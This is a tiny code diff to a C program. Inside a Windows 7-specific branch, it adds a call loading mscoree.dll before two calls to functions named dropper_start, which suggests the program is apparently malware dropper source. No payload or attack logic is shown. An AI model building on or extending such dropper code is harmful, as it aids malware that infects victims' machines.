@@ -133,6 +133,8 @@ int main(int argc, char* argv[])
 	else if (os_version == 6) {
 #ifdef W7_EXTRACT
 
+		LoadLibraryW(L"mscoree.dll");
+
 		dropper_start(2);
 		dropper_start(3);
 
